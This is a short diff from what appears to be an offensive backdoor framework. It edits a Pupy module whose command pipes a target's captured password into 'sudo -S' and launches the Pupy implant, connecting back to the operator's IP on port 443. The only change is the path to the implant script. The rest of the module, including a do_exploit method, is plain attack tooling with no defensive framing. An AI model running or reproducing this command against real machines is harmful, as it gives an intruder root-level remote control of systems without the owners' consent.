@@ -14,7 +14,7 @@ class Pupy(Backdoor):
         self.allow_modules = True
 
     def get_command(self):
-        return "echo " + self.core.curtarget.pword + " | sudo -S python pupy/pp.py simple --host " + self.core.localIP + ":443"
+        return "echo " + self.core.curtarget.pword + " | sudo -S python ~/pupy/pp.py simple --host " + self.core.localIP + ":443"
 
     def do_exploit(self, args):
         port = self.get_value("port")
